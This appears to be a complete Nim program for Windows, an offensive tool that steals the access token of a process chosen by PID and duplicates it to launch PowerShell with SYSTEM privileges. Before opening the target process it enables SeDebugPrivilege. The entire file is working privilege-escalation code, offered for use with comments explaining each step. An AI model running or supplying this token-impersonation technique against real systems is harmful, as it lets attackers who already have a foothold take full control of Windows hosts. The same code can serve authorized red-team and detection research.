import winim/inc/windef
import winim/inc/winbase
import winim/lean
import os
import strutils

# check if at least 1 command-line argument is passed to the program
if paramCount() < 1:
    echo "Usage:\n  ", splitPath(getAppFilename()).tail, " PID"
    system.quit(1)

# define some variables and their type
# var -> mutable, let -> immutable
var
    luid : LUID
    tp : TOKEN_PRIVILEGES
    privilegeName : wstring
    x : BOOL
    currentProcessHandle, systemProcessHandle, tokenHandle, accessToken, newTokenHandle : HANDLE
    pi : PROCESS_INFORMATION
    si : STARTUPINFO
    cb, targetProcessId : DWORD

# initialize some variables
cb = (DWORD) sizeof(TOKEN_PRIVILEGES)
privilegeName = L"SeDebugPrivilege"

# set the target process based on the command line argument 
targetProcessId = (DWORD) parseInt(paramStr(1))

# get the LUID (Locally Unique Identifier) of the specified privilege (SeDebugPrivilege)
# first parameter is NULL because the lookup needs to be done on the local machine
x = LookupPrivilegeValue(NULL, &privilegeName, &luid)

if x == 0:
    echo "[!] LookupPrivilegeValue failed. Error: ", GetLastError()
    system.quit(1)

# enable SeDebugPrivilege
tp.PrivilegeCount = 1
tp.Privileges[0].Luid = luid
tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

# get a handle for the current process
currentProcessHandle = GetCurrentProcess()

# get a handle for the Access Token of the current process
x = OpenProcessToken(currentProcessHandle, TOKEN_ADJUST_PRIVILEGES, &accessToken)

if x == 0:
    echo "[!] OpenProcessToken failed. Error: ", GetLastError()
    system.quit(1)

# enable the SeDebugPrivilege in the specified access token
x = AdjustTokenPrivileges(accessToken, FALSE, &tp, cb, NULL, NULL)

if x == 0:
    echo "[!] AdjustTokenPrivileges failed. Error: ", GetLastError()
    system.quit(1)

# get a handle for the system process
systemProcessHandle = OpenProcess(PROCESS_QUERY_INFORMATION, True, targetProcessId)

x = GetLastError()
if x != 0 or systemProcessHandle == 0:
    echo "[!] OpenProcess failed. Error: ", x

# get the access token for the system process 
x = OpenProcessToken(systemProcessHandle, TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY or TOKEN_QUERY, &tokenHandle)

if x == 0 or x == ERROR_NOACCESS:
    echo "[!] OpenProcessToken failed. Error: ", GetLastError()

# duplicate the token (Impersonation)
x = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT or TOKEN_ADJUST_SESSIONID or TOKEN_QUERY or TOKEN_DUPLICATE or TOKEN_ASSIGN_PRIMARY, NULL, securityImpersonation, tokenPrimary, &newTokenHandle)

if x == 0:
    echo "[!] DuplicateTokenEx failed. Error: ", GetLastError()

# spawn a powershell shell with SYSTEM privileges
x = CreateProcessWithTokenW(newTokenHandle, LOGON_WITH_PROFILE, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", NULL, 0, NULL, NULL, &si, &pi)

if x == 0:
    echo "[!] CreateProcessWithTokenW failed. Error: ", GetLastError()